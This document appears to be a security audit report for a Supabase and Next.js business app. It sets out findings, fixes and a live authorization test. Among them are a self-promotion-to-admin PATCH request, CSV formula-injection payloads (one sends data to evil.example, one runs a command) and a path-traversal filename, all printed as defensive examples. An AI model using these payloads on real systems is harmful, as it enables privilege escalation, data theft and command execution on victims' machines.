# Security Review — Adminidor

**Date:** 2026-05-30
**Scope:** Full application — server actions, route handlers, RLS policies, service-role usage, the Assistant/LLM surface, Cloudflare R2 file handling, CSV export, secrets/config, and dependencies.
**Method:** Static code audit (3 parallel focused reviews) + automated sweeps (`npm audit`, git-history secret scan, static greps) + a **live cross-role authorization matrix** run against the production Supabase database with throwaway users (created and deleted during the test).
**Commit reviewed:** `b7201e5` (working tree clean apart from the local-only `.env.local` logo override).

---

## Executive summary

The app's authorization model is **RLS-first** and, with **one critical exception**, that model is implemented correctly: anonymous users are blocked, admin-only writes are enforced at the database, time entries are owner-scoped, and the Assistant's private conversations are properly isolated. The live matrix passed 9 of 10 checks.

The **one critical exception is serious and live-exploitable**: any authenticated member can promote themselves to administrator with a single HTTP request, completely bypassing the admin module. This must be fixed before any production use. There is also one **high** issue (CSV formula injection) and a cluster of **medium** hardening gaps around file uploads, rate-limiting, and document-level authorization.

| # | Severity | Finding | Location |
|---|----------|---------|----------|
| 1 | **🔴 Critical** | Privilege escalation: member can self-promote to `admin` via `profiles` UPDATE (**confirmed live**) | `supabase/migrations/0001_init.sql:175‑178` |
| 2 | **🟠 High** | CSV formula injection in time-entries export | `admin/export/time-entries/route.ts:8‑11` |
| 3 | **🟡 Medium** | R2 presigned upload key uses raw `fileName` → path traversal across owner prefixes | `src/lib/r2/actions.ts:34` |
| 4 | **🟡 Medium** | Presigned PUT enforces no size limit and no content-type allowlist | `src/lib/r2/presign.ts:8‑19` |
| 5 | **🟡 Medium** | No rate limiting on the Assistant chat route (DoS / API-cost exhaustion) | `assistant/chat/route.ts` |
| 6 | **🟡 Medium** | `documents` INSERT not bound to `owner_id`; upload/attach not authorized per-owner | `0001_init.sql:215‑216`, `documents/actions.ts`, `r2/actions.ts` |
| 7 | **🟡 Medium** | All staff can download every document (incl. KYC/AML) and any client timesheet PDF | `documents/actions.ts:80‑95`, `reports/timesheet/pdf/route.ts` |
| 8 | **🟡 Medium** | `listUsers`/`getAdminUser` use service-role with no internal admin check (caller-gated only) | `src/modules/admin/queries.ts:24,45` |
| 9 | **🔵 Low** | No `import "server-only"` guard on service-role / R2 modules | `src/lib/supabase/admin.ts`, `src/lib/r2/*` |
| 10 | **🔵 Low** | Assistant actions skip the `unknown`+zod / `getUser()` convention (contained by RLS) | `src/modules/assistant/actions.ts` |
| 11 | **🔵 Low** | Unbounded individual tool-result rows fed back to the model | `src/modules/assistant/tools.ts` |
| 12 | **⚪ Info** | Client PII + AML data egresses to Anthropic via tool results (compliance/DPA) | `src/modules/assistant/*` |
| 13 | **⚪ Info** | `npm audit`: `postcss <8.5.10` moderate (transitive via Next; build-time only) | `node_modules/next` |

**Verified clean / good practices:** no secrets in git history; `.env.local` never tracked and `.gitignore` correct; no secrets exposed via `NEXT_PUBLIC_`; server code uses `getUser()` (not `getSession()`) everywhere; RLS enabled on all 9 tables; no `dangerouslySetInnerHTML`; model output rendered as escaped plain text; no string-concatenated SQL/PostgREST filters; `is_admin()` is `SECURITY DEFINER` with a pinned `search_path` (recursion-safe); the signup trigger cannot self-assign `admin`.

---

## 1. 🔴 CRITICAL — Privilege escalation via the `profiles` UPDATE policy

**Location:** `supabase/migrations/0001_init.sql:175‑178`

```sql
create policy profiles_update_self_or_admin on public.profiles
  for update to authenticated
  using (id = auth.uid() or public.is_admin())
  with check (id = auth.uid() or public.is_admin());
```

**The flaw.** RLS gates *which rows* a user may update — it cannot gate *which columns*. This policy lets a user update their own profile row (`id = auth.uid()`), and the `role` column lives on that same row. So a member can set their own `role` to `admin`. The app's UI routes role changes through the service-role admin module (which *is* properly gated), but nothing stops a user from talking to PostgREST directly with the public anon key and their own session JWT — both of which are present in the browser.

**Confirmed live.** The cross-role matrix created a throwaway `member`, signed in, and sent:

```
PATCH /rest/v1/profiles?id=eq.<own-uid>
apikey: <anon key>   Authorization: Bearer <member JWT>
{ "role": "admin" }
```

Result: **HTTP 200, role afterwards = `admin`.** (The test then reset the role and deleted the user.)

**Impact.** Full privilege escalation. Once `admin`, the attacker passes every `is_admin()` check: write/delete all clients, projects, KYC/AML records and beneficial owners; read and download every document; export all time entries; create/disable/relabel users. This collapses the entire authorization model for any one authenticated staff account.

**Remediation.** RLS alone cannot fix this — add a column-level defense. Two options (apply **both** for defense in depth):

1. **Column privilege** — stop `authenticated` from writing `role` at all; only the service-role admin path may:
   ```sql
   revoke update (role) on public.profiles from authenticated;
   ```
   (Self-service updates to `full_name`/`locale` keep working; the service-role client used by the admin module bypasses this and can still set roles.)

2. **Trigger guard** — belt-and-braces, blocks any role change not made by an admin:
   ```sql
   create or replace function public.prevent_role_self_change()
   returns trigger language plpgsql security definer set search_path = public as $$
   begin
     if new.role is distinct from old.role and not public.is_admin() then
       raise exception 'not authorized to change role';
     end if;
     return new;
   end $$;

   create trigger profiles_no_role_self_change
     before update on public.profiles
     for each row execute function public.prevent_role_self_change();
   ```

Ship as `supabase/migrations/0007_security_hardening.sql`. After applying, re-run the matrix to confirm the PRIV-ESC check flips to PASS.

---

## 2. 🟠 HIGH — CSV formula injection in the time-entries export

**Location:** `src/app/[locale]/(app)/admin/export/time-entries/route.ts:8‑11`

```js
function csvCell(value) {
  const s = value == null ? "" : String(value);
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
```

`csvCell` correctly quotes delimiters but does **not** neutralize spreadsheet formula prefixes. Several exported fields are user-controlled — client name, project name, and the free-text time-entry `description`. A value such as `=HYPERLINK("https://evil.example/?leak="&A1)` or `=cmd|'/c calc'!A1` is written verbatim and **executes when the CSV is opened in Excel / Google Sheets / LibreOffice**, enabling data exfiltration or local command execution on the admin's machine. (The export is admin-only, which limits *who* triggers it — but the attacker is whoever typed the client/description text, i.e. any member.)

**Remediation.** Prefix any cell beginning with a formula trigger with a single quote before quoting:

```js
function csvCell(value) {
  let s = value == null ? "" : String(value);
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;          // neutralize formula injection
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
```

---

## 3. 🟡 MEDIUM — R2 presigned key uses raw `fileName` (path traversal across owner prefixes)

**Location:** `src/lib/r2/actions.ts:34`

```js
const key = `${ownerType}/${ownerId}/${randomUUID()}-${fileName}`;
```

`fileName` is validated only as `z.string().min(1).max(255)`. Because R2/S3 treat `/` as a path separator, a `fileName` like `../../client/<otherId>/evil.pdf` (or one containing embedded `/`, NUL, or CR/LF) is interpolated directly into the object key and relocates the upload outside the intended `ownerType/ownerId/` prefix — e.g. under another owner's prefix or a `report/` namespace. The `randomUUID()` segment prevents *overwriting* an existing object but does not constrain the path.

**Remediation.** Reduce `fileName` to a sanitized basename before building the key (keep the original name only in the DB `file_name` column):

```js
import { basename } from "node:path";
const safe = basename(fileName).replace(/[^\w.\-]+/g, "_").slice(0, 200) || "file";
const key = `${ownerType}/${ownerId}/${randomUUID()}-${safe}`;
```

---

## 4. 🟡 MEDIUM — Presigned PUT has no size limit and no content-type allowlist

**Location:** `src/lib/r2/presign.ts:8‑19` (+ `r2/actions.ts:34‑35`)

`createUploadUrl` signs a `PutObjectCommand` with only `Key` and `ContentType`, and `ContentType` comes straight from the client (`z.string().min(1)`, no allowlist). There is no `content-length-range` condition, so within the 5-minute window the URL holder can upload a file of **any type and any size** (storage-cost / DoS, and a malware-hosting vector).

**Remediation.** Restrict `contentType` to an allowlist (e.g. PDF/PNG/JPEG/common office types) and enforce a maximum size. A presigned **POST** policy supports a `content-length-range` condition directly; if staying with PUT, validate the declared size server-side and reject oversized/disallowed types before signing, and verify object size out-of-band after upload.

---

## 5. 🟡 MEDIUM — No rate limiting on the Assistant chat route

**Location:** `src/app/[locale]/(app)/assistant/chat/route.ts`

There is no rate limiting anywhere in the app (`proxy.ts` only runs i18n + session refresh). Any authenticated user can POST unbounded requests to `/{locale}/assistant/chat`, each spawning up to `MAX_ITERATIONS = 6` Opus 4.8 calls at `max_tokens: 16000` with adaptive thinking. This is a direct **API-cost-exhaustion / DoS** lever.

**Remediation.** Add a per-user rate limit keyed on `user.id` (token bucket / fixed window — e.g. Upstash Redis, or an in-DB counter for a single instance) on this route, plus a global concurrency or daily-spend cap. Consider lowering `max_tokens`/iterations to the minimum the UX needs.

---

## 6. 🟡 MEDIUM — `documents` INSERT not bound to `owner_id`; upload/attach not authorized per-owner

**Location:** `0001_init.sql:215‑216`, `src/modules/documents/actions.ts` (`attachDocument`), `src/lib/r2/actions.ts` (`requestUploadUrl`)

```sql
create policy documents_insert_own on public.documents
  for insert to authenticated with check (uploaded_by = auth.uid());
```

The INSERT check binds only `uploaded_by` to the caller — it does **not** verify the caller may write to the target `owner_id`. Combined with `requestUploadUrl`/`attachDocument` accepting any `ownerId` with no per-owner authorization, any member can mint an upload URL and register a document row against **any** client or project (including clients that are otherwise admin-write-only). Low data-confidentiality impact in the single-firm model, but it lets a member plant arbitrary files/metadata on any client's record and pollute KYC document lists.

**Remediation.** If documents on `client` owners should be admin-managed (consistent with clients being admin-write), gate `attachDocument`/`requestUploadUrl` behind `isCurrentUserAdmin()` for `ownerType === "client"`, and/or tighten the INSERT policy to require admin for client-owned documents. At minimum, validate that `r2Key`'s prefix matches the row's `ownerType/ownerId` at attach time (today `attachDocument` stores whatever key the client sends).

---

## 7. 🟡 MEDIUM — All staff can download every document and any client timesheet (incl. KYC/AML PII)

**Location:** `src/modules/documents/actions.ts:80‑95` (`getDocumentDownloadUrl`), `src/app/[locale]/(app)/reports/timesheet/pdf/route.ts`

`documents_select` is `using (true)`, so any authenticated member can call `getDocumentDownloadUrl` with any document `id` and receive a working presigned R2 URL — including client KYC/AML attachments and admin-approved report PDFs. Likewise the timesheet PDF route authenticates the caller but applies **no admin check and no per-client scoping**, so any member can download a full financial timesheet for any client. Note the asymmetry: the *approve-and-store* path is admin-gated, but this *raw PDF export* is not.

This is consistent with the documented "single firm: all staff read all data" model, so it may be **intended** — but KYC/AML material and client financials are exactly the sensitive categories where firms usually want admin-only access. Flagging for a conscious decision.

**Remediation (if confidentiality is desired).** Scope `documents_select` (and `getDocumentDownloadUrl`) by sensitivity — e.g. restrict `kind='report'` and KYC-linked documents to `is_admin()` — and add `isCurrentUserAdmin()` to the timesheet PDF route (as the CSV route already does). Otherwise, document explicitly that all staff may read all documents and client financials.

---

## 8. 🟡 MEDIUM — `listUsers` / `getAdminUser` use service-role with no internal admin check

**Location:** `src/modules/admin/queries.ts:24,45`

These functions call `createAdminClient()` — a full RLS-bypass that enumerates all auth users and emails — and rely entirely on the *caller* (`admin/page.tsx`, `admin/users/[id]/edit/page.tsx`) to gate with `isCurrentUserAdmin()`. Both current callers do gate correctly, so this is **not currently exploitable**, but an unguarded function that dumps every user's email is one careless future import away from an auth-data leak. (By contrast, `admin/actions.ts` self-gates with `requireAdmin()`.)

**Remediation.** Add a `requireAdmin()`-style check *inside* `listUsers`/`getAdminUser` so the service-role data access is gated at the data layer, not only at each call site.

---

## 9. 🔵 LOW — Missing `server-only` guard on service-role / R2 modules

**Location:** `src/lib/supabase/admin.ts`, `src/lib/r2/client.ts`, `src/lib/r2/config.ts`

These modules read server secrets (service-role key, R2 credentials) but lack an `import "server-only";` guard. They are currently imported only by server code (verified), so nothing leaks today. Adding the guard makes any accidental future import from a client component a **build-time error** instead of a runtime secret leak.

**Remediation.** Add `import "server-only";` at the top of each.

---

## 10. 🔵 LOW — Assistant actions skip the `unknown`+zod / `getUser()` convention

**Location:** `src/modules/assistant/actions.ts` (`commitProposedTimeEntry`, `deleteConversation`)

These are the only two `"use server"` actions that accept typed parameters instead of `unknown`, do no zod validation at the boundary, and perform no own `getUser()` check. They are currently safe only because downstream `createTimeEntry` re-validates and binds `user_id`, and because owner-only RLS on `assistant_conversations`/`_messages` contains the trusted `conversationId` (a forged id fails silently). Tightening them removes the implicit dependency and the silent-failure behavior.

**Remediation.** Accept `unknown`, validate with a zod schema, add a `getUser()` guard, and return an observable `ActionResult`.

---

## 11. 🔵 LOW — Unbounded individual tool-result rows

**Location:** `src/modules/assistant/tools.ts`

Tool results cap *row count* (`.slice(0, 200)`) but not row *size* — `get_client` returns the full client with all beneficial owners and AML screenings, and `description` fields are uncapped. A large client record produces a very large tool result fed back to the model each loop (latency/cost).

**Remediation.** Truncate long text fields and cap nested arrays in tool results.

---

## 12. ⚪ INFO / Compliance — Client PII + AML data egresses to Anthropic

**Location:** `src/modules/assistant/*`

`get_client`, `timesheet`, and `list_clients` results are serialized into tool-result blocks sent to the Anthropic API — including `national_id`, nationality, KYC status/risk, beneficial owners, and AML screening records. Not a code defect, but a data-protection consideration: AML/KYC personal data leaves the firm's processor boundary. Ensure an Anthropic DPA with zero-retention is in place and that this transfer is covered in the firm's records of processing (GDPR Art. 30) and AML confidentiality obligations.

---

## 13. ⚪ INFO — `npm audit`

`postcss <8.5.10` (moderate, "XSS via unescaped `</style>` in stringify output") pulled in transitively via `next`. The only `npm audit fix --force` path is a bogus downgrade to `next@9.3.3` — do **not** take it. This is a **build-time** dependency (CSS processing), not a runtime exposure for this app. Track the Next.js release that bumps the bundled `postcss` and update then. No action required now beyond awareness.

---

## Live cross-role RLS matrix — results

Run against the production Supabase project with two throwaway `member` users (deleted afterward; all test rows cleaned up).

| Check | Result |
|-------|--------|
| `member` self-promote to `admin` via `profiles` PATCH | **✗ FAIL — escalation succeeded (HTTP 200, role=admin)** → Finding #1 |
| anon cannot read `clients` | ✓ PASS (0 rows) |
| `member` can read `clients` (read-all model) | ✓ PASS |
| `member` cannot INSERT a client | ✓ PASS (403) |
| `member` cannot UPDATE a client | ✓ PASS (0 rows changed) |
| `member` cannot read another member's conversations | ✓ PASS |
| `member` cannot write into another member's conversation | ✓ PASS (403) |
| `member` cannot insert a time entry owned by another user | ✓ PASS (403) |

**9 / 10 passed.** The single failure is the Critical finding above.

---

## Remediation checklist (priority order)

> **Status — 2026-05-30.** Code fixes for #1–#6 and #8–#11 are implemented (`tsc`/lint/build green). #1 also requires applying **`supabase/migrations/0007_security_hardening.sql`** to the database; once applied, re-run the live matrix to confirm the PRIV-ESC check flips to PASS. #7 is left as the documented "all staff read all firm data" model pending a product/compliance decision.

- [x] **#1 (Critical)** — `supabase/migrations/0007_security_hardening.sql` added: `revoke update on profiles` + `grant update (full_name, locale)` to `authenticated`, plus a `prevent_role_self_change` trigger. **Apply the migration, then re-run the matrix. Block production until applied.**
- [x] **#2 (High)** — `csvCell` now prefixes `=`/`+`/`-`/`@`/tab/CR cells with `'` (`admin/export/time-entries/route.ts`).
- [x] **#3 (Medium)** — `fileName` reduced to a sanitized basename before the R2 key is built (`src/lib/r2/actions.ts`).
- [x] **#4 (Medium)** — Content-type allowlist + 25 MB cap; presigned PUT pins `ContentType` and `ContentLength` (`src/lib/r2/{config,presign,actions}.ts`, client pre-check in `documents-section.tsx`).
- [x] **#5 (Medium)** — Per-user rate limit (20/min) on the Assistant chat route (`src/lib/rate-limit.ts`, `assistant/chat/route.ts`).
- [x] **#6 (Medium)** — `attachDocument` rejects an `r2Key` whose prefix doesn't match `ownerType/ownerId/`.
- [x] **#7 (Medium)** — **Decided 2026-05-30: keep all-staff read.** The single-firm "all staff read all firm data" model is intentional; no restriction applied. Revisit if the firm later needs admin-only access to KYC/AML documents or financial reports.
- [x] **#8 (Medium)** — `listUsers`/`getAdminUser` now call `isCurrentUserAdmin()` internally (`src/modules/admin/queries.ts`).
- [x] **#9 (Low)** — `import "server-only"` added to `supabase/admin.ts`, `r2/client.ts`, `r2/config.ts`.
- [x] **#10–#11 (Low)** — Assistant actions accept `unknown` + zod + `getUser()` + ownership check; tool results truncate long text and cap nested arrays.
- [ ] **#12 (Info)** — Confirm Anthropic DPA / zero-retention and update RoPA.
- [ ] **#13 (Info)** — Track Next.js update for the `postcss` advisory.

---

## Notes on methodology & integrity

- The live matrix used **throwaway accounts only** (`rls-test-*@example.invalid`), reset any mutated state, and deleted the users and test rows in a `finally` block. No production data was modified.
- Secret values were **masked** throughout (only key prefixes were ever printed). `.env.local` was never committed and is correctly covered by `.gitignore` (`.env*` with a `!.env.example` exception). The git-history scan surfaced only env-var *names* in source/docs, no literal secrets.
- This review covers application and database authorization. It does **not** cover: Cloudflare R2 bucket CORS/IAM configuration (server-side, not in the repo), Supabase project-level settings (JWT expiry, email-auth hardening, network restrictions), or infrastructure/transport security of the eventual deployment.
